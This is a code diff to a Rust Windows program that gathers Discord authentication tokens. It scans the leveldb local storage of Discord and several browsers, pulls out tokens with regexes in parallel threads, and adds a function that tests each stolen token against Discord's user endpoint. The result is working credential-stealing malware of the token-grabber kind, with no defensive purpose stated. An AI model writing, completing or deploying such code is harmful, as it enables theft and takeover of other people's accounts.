@@ -1,15 +1,24 @@
-extern crate native_windows_gui as nwg;
 extern crate native_windows_derive as nwd;
+extern crate native_windows_gui as nwg;
 
-use nwd::NwgUi;
-use nwg::NativeUi;
+use std::collections::HashMap;
 use std::env;
 use std::ffi::OsString;
-use std::path::Path;
 use std::fs;
 use std::fs::File;
-use std::io::{self, prelude::*, BufReader};
+use std::io::{self, BufReader, prelude::*};
+use std::path::Path;
+use std::sync::{Arc, Mutex};
+use std::thread;
+use std::thread::JoinHandle;
 
+use encoding_rs::WINDOWS_1252;
+use encoding_rs_io::DecodeReaderBytesBuilder;
+use nwd::NwgUi;
+use nwg::NativeUi;
+use regex::{Regex, RegexSet};
+use reqwest::RequestBuilder;
+use serenity::futures::TryFutureExt;
 
 #[derive(Default, NwgUi)]
 pub struct BasicApp {
@@ -49,7 +58,9 @@ fn main() {
 
 
     // Prints out all the tokens we found
-    println!("{:?}", find_token())
+    let tokens = find_token();
+    println!("{:?}", &tokens);
+    let verified = verify_token(vec![tokens.get(0).unwrap().clone()]);
 }
 
 
@@ -58,6 +69,8 @@ fn find_token() -> Vec<String> {
     // Get the local and appdata files
     let local_path = env::var_os("LOCALAPPDATA").unwrap();
     let roaming_path = env::var_os("APPDATA").unwrap();
+    let match_one = Arc::new(Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap());
+    let match_two = Arc::new(Regex::new(r"mfa\.[\w-]{84}").unwrap());
 
     // All paths for discord tokens, initialized into vector
     let paths: Vec<String> = vec![
@@ -70,9 +83,11 @@ fn find_token() -> Vec<String> {
         format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
     ];
 
-    // Initialize a new vector of strings
-    let tokens: Vec<String> = Vec::new();
+    // Initialize a new vector of strings that is atomic
+    let mut tokens: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
 
+    // Make a list of running threads
+    let mut handles = Vec::new();
 
     // Go through all paths
     for path in paths.into_iter() {
@@ -83,6 +98,7 @@ fn find_token() -> Vec<String> {
         if !&new_path.exists() {
             continue;
         }
+
 
         // Get all files in the directory
         let paths = fs::read_dir(new_path).unwrap();
@@ -96,22 +112,72 @@ fn find_token() -> Vec<String> {
 
             // If the file is not a .log or .ldb we don't care about it
             if !(string.ends_with(".log") || string.ends_with(".ldb")) {
-                continue
+                continue;
             }
 
-            println!("{}", string);
+            // Viable file, spawn a new thread and move on to the next task
 
-            // Open the file we have
-            let file = File::open(unwrapped);
-            // Make a new reader for the file
-            let reader = BufReader::new(file.unwrap());
-            // Read the file line by line
-            for line in reader.lines() {
-                println!("{}", line.unwrap_or(String::from("Err")));
-            }
+            // Clone variables for per-thread and atomic operations
+            let match_one = match_one.clone();
+            let match_two = match_two.clone();
+            let tokens = tokens.clone();
+            handles.push(thread::spawn(move || {
+
+                // Open the file we have
+                let file = File::open(unwrapped).unwrap();
+
+                // Make a decoder to decode the files
+                let mut reader =
+                    DecodeReaderBytesBuilder::new()
+                        .encoding(Some(WINDOWS_1252))
+                        .build(file);
+
+                // make a new string to hold the content of the file
+                let mut content = String::new();
+
+                // write the content file to the string
+                reader.read_to_string(&mut content);
+
+                // Find all matches for the first regex
+                for cap in match_one.find_iter(&content) {
+                    // Get a thread lock on the mutex and add token matches to it
+                    tokens.lock().unwrap().push(String::from(cap.as_str()))
+                }
+
+                // Find all matches for second regex
+                for cap in match_two.find_iter(&content) {
+                    // Get a thread lock on the mutex and add token matches to it
+                    tokens.lock().unwrap().push(String::from(cap.as_str()))
+                }
+            }));
         }
     }
 
+    // Go through all handles
+    for handle in handles.into_iter() {
+        // Block on each thread until finished
+        handle.join().unwrap();
+    }
+
     // Return list of tokens
-    return tokens;
+    return Arc::try_unwrap(tokens).unwrap().into_inner().unwrap();
+}
+
+async fn verify_token(tokens: Vec<String>) -> Vec<String> {
+    // Make a client for verifying the list of tokens
+    let client = reqwest::Client::new();
+
+    // A for loop for each token
+    for token in tokens.iter() {
+        // Make an identity request for each token
+        let res = client.get("https://discordapp.com/api/v6/users/@me")
+            .header("Authorization", token.clone()).header("Content-Type", "application/json")
+            .send().await.unwrap();
+
+        println!("{}", res.text().await.unwrap());
+
+    }
+
+    // A placeholder list
+    Vec::new()
 }
